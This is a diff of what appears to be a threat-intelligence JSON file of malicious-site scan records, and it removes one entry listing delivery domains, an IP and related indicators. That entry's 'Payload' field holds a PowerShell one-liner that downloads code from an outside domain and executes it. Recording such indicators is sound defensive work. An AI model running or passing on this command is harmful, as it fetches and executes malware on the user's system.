@@ -5251,28 +5251,5 @@
     ],
     "ReportId": "cmwmw4g2q1ulx0omljr4g3cvy",
     "ScannedAt": "2026-11-19T01:47:35.719000+00:00"
-  },
-  {
-    "UrlDomain": "purebrookkitchens.com",
-    "DeliveryUrl": [
-      "lskannsserv.beer",
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.0.94"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/7570b7171e7d3dd2",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/7570b7171e7d3dd2'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/7570b7171e7d3dd2"
-    ],
-    "ReportId": "cmwmti3a11uip0omlvh5hjhr9",
-    "ScannedAt": "2026-11-19T00:34:13.487000+00:00"
   }
 ]
